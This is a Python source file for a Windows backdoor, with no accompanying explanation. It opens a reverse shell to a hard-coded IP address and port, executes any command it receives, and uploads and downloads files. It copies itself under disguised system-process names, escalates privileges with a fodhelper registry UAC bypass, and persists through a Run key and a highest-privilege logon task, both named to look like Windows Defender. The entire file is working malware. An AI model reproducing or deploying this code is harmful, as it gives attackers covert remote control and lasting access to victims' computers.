import socket
import time
import subprocess
import json
import os
import sys
import shutil
import winreg as reg
import random
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def log_process_info():
    try:
        log_path = os.getenv("APPDATA") + "\\Microsoft\\Windows\\admin_process.log"
        with open(log_path, "a") as f:
            f.write(f"{time.ctime()} - is_admin: {is_admin()}\n")
    except Exception:
        pass

def reliable_send(data):
    jsondata = json.dumps(data)
    try:
        s.send(jsondata.encode())
    except Exception:
        reliable_send(Exception)

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except TypeError:
            reliable_send(TypeError)
            continue
        except:
            reliable_send('recieve error')
            continue

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            reliable_send('Error: ' + e)
            break
        except Exception as e:
            reliable_send('Error: ' + e)
            break
    s.settimeout(None)
    f.close()

def uac_bypass(elevated_path):
    try:
        reg_path = 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command'
        os.system(f'reg add {reg_path} /v DelegateExecute /f')
        os.system(f'reg add {reg_path} /ve /d "{elevated_path}" /f')
        result = os.system('start fodhelper.exe')
        if result != 0:
            return 'failed'
    except:
        reliable_send('UAC ERROR')
        return 'failed'

def copy_to_stealth_path():
    try:
        new_name = random.choice([
            "WinSxSHost.exe", "svchst.exe", "explorre.exe", "OneDr1veSync.exe", "sysdiaghoster.exe",
            "MsMpEgine32.exe", "taskhostw64.exe", "conhost2.exe", "spoold32.exe", "defupdate32.exe",
            "cortnanaHelper.exe", "RuntimeSysHost.exe", "update_module.exe", "edge_loader.exe",
            "netcfgsvc.exe", "usbchost.exe", "WinAudioHlp.exe", "svch0stHlp.exe", "systemnt.exe",
            "autoupdtr.exe", "dllcachehost.exe", "WinSyncTray.exe", "ShellSysTask.exe", "winhlper.exe",
            "driverchk.exe", "CrashHandlerSrv.exe", "audiofxhost.exe", "dwmexec32.exe", "WinIdleTask.exe",
            "msdnsconfig.exe", "netsh_helper.exe", "bootrecsvc.exe", "cloudprovider64.exe", "ntdlldrhost.exe",
            "msdbupdater.exe", "printvwrhost.exe", "diskhost64.exe", "LogiSrvSync.exe", "WpnUserServicex.exe",
            "edgebgsvc.exe", "usbhid32svc.exe", "MouseSrvHost.exe", "kbdntask32.exe", "netbioshlp.exe",
            "fontcachex.exe", "DbgHelpSvc.exe", "audioCpl32.exe", "hostsyscore.exe", "AppXloader.exe",
            "lsasscopy.exe", "ntqueryhost.exe", "smartscreen64x.exe", "backgroundedgetray.exe",
            "SecureBootSync.exe", "AudioDumpSys.exe", "rdpcfgmanager.exe", "oobeservice64.exe",
            "MsSrvContainer.exe", "taskmanui.exe", "ProcessIdle32.exe", "windbglaunch.exe", "powershellpx.exe",
            "svch0std.exe", "SecureSettingsLoader.exe", "cmdbackdrop.exe", "WuaUsrHost.exe",
            "usbconfigurator.exe", "wificonfigsx.exe", "MsSpoolInit.exe", "dnsupdaterhelper.exe",
            "FirewallNetHost.exe", "bootoptmgr.exe", "ShellHostX64.exe", "certlmupdate.exe",
            "SystemIdleSrv.exe", "nethosthelper.exe", "WinBootProc.exe", "regsvcchk.exe", "winloginplus.exe",
            "bootentrytool.exe", "vmhostsvc.exe", "hypervloader.exe", "syspolicymgr.exe", "hostinfocore.exe",
            "dxgkrnlproxy.exe", "graphupdatehost.exe", "keybdloader.exe", "taskmanx32.exe", "usbmountsvc.exe",
            "nvctrlhost.exe", "speechtasker.exe", "HidSrvHost.exe", "cryptobackup.exe", "msloadcheck.exe",
            "wlanhosttask.exe", "keyboardidle.exe", "accessibilityhost.exe", "driverhost64.exe",
            "hvcpphost.exe", "protectioninit.exe"
        ])
        target_dir = os.getenv("APPDATA") + "\\Microsoft\\Windows\\"
        os.makedirs(target_dir, exist_ok=True)
        new_path = os.path.join(target_dir, new_name)
        if not os.path.exists(new_path):
            shutil.copyfile(sys.executable, new_path)
        return new_path
    except:
        reliable_send('COPY ERROR')
        return 'failed'

def add_registry_persistence(exe_path):
    try:
        key = r"Software\Microsoft\\Windows\\CurrentVersion\\Run"
        reg_key = reg.CreateKey(reg.HKEY_CURRENT_USER, key)
        reg.SetValueEx(reg_key, "Defender", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(reg_key)
        return 'Successful'
    except:
        return 'Failed'

def add_task_scheduler_persistence(exe_path):
    try:
        task_name = "WindowsDefenderService"
        os.system(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f')
        return 'Successful'
    except:
        return 'Failed'

def shell():
    log_process_info()  # Log admin durumu
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command.startswith('cd '):
            try:
                os.chdir(command[3:])
                reliable_send(f"Changed directory to {os.getcwd()}")
            except Exception as e:
                reliable_send(f"cd error: {e}")
        elif command.startswith('download'):
            upload_file(command[9:])
        elif command.startswith('upload'):
            download_file(command[7:])
        elif command == 'uac':
            new_path = copy_to_stealth_path()
            if new_path and uac_bypass(new_path) != 'failed':
                reliable_send("[!] UAC bypass initiated. Exiting current session.")
                s.close()
                os._exit(0)
        elif command == 'persistence':
            if is_admin() != True: reliable_send('[*] You need Admin Permissions!'); continue;
            exe_path = sys.executable
            ARP = add_registry_persistence(exe_path)
            ATS = add_task_scheduler_persistence(exe_path)
            reliable_send(f"Registry persistence: {ARP}\nTask Scheduler persistence: {ATS}")
        elif command == 'isadmin':
            admin = is_admin()
            reliable_send(f"[+] Admin: {admin}")
        elif command == 'b''': # Connection control
            pass
        else:
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = execute.communicate(timeout=10)
                result = stdout + stderr
                reliable_send(result.decode())
            except Exception as e:
                reliable_send(f"Command execution error: {e}")

def connection():
    while True:
        try:
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('192.168.178.32', 6666))
            shell()
            s.close()
            break
        except Exception:
            time.sleep(20)
def ensure_single_instance():
    time.sleep(11)
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Service Host: Windows Connector")
    # ERROR_ALREADY_EXISTS = 183
    if ctypes.GetLastError() == 183:
        os._exit(0)
ensure_single_instance()
connection()
